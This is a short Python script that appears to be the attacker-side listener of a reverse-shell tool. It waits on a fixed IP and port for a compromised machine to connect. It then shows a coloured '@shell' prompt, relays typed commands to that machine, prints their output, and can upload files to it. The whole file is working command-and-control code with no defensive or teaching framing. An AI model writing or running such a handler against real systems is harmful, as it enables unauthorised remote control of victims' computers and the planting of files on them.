import socket 

class bcolors:
    
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'


def upload_file(file_name):

    with open(file_name,"rb") as file:
        data = file.read()
    
    conn.send(data)
    conn.send(b"<END>")

    file.close()

if __name__ == '__main__':

    HOST = "192.168.1.102"
    PORT = 5555

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind((HOST,PORT))
    sock.listen()
    
    conn,addr = sock.accept()

    print(bcolors.OKGREEN + "[+] Connected by " + addr[0] + bcolors.ENDC)
    
    while True:

        try:
            command = input(bcolors.OKCYAN + "[" + addr[0] + "]" + " @shell ~ " + bcolors.ENDC)
            try:
                conn.send(command.encode())
            except:
                pass
            
            if command[:6] == "upload":
                
                upload_file(command[7:])

            if command == "exit":
                print(bcolors.WARNING + "\n[-] QUIT" + bcolors.ENDC)
                break
                
            if command[:2] != "cd" and command[:6] != "upload":
                data = conn.recv(1024)
                print(data.decode())

        except KeyboardInterrupt:
            print(bcolors.WARNING + "\n[-] QUIT" + bcolors.ENDC)
            break
